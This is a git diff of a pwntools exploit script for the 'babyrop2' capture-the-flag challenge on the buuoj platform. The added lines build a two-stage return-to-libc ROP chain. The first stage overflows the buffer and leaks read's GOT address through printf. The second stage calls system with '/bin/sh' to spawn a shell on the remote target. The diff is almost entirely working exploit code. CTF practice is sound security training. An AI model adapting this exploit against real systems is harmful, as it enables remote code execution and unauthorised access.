@@ -28,12 +28,21 @@ uu64    = lambda data               :u64(data.ljust(8,'\0'))
 leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
 
 context(arch='amd64', os='linux', log_level = 'DEBUG')
-binary = './pwn'
+binary = './babyrop2'
 elf = ELF(binary)
-p = remote('node3.buuoj.cn',20000) if argv[1]=='r' else process(binary)
+#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+p = remote('node3.buuoj.cn',29558) if argv[1]=='r' else process(binary)
 
 # start
-
+pop_rdi = 0x400733
+payload = flat('a'*0x28,pop_rdi,elf.got['read'],elf.plt['printf'],elf.sym['main'])
+sla('name?', payload)
+ru('\n')
+read = uu64(r(6))
+leak('read', read)
+system, binsh = ret2libc(read, 'read', './libc.so.6')
+payload = flat('a'*0x28,pop_rdi,binsh,system,'a'*8)
+sla('name?', payload)
 # end
 
 itr()
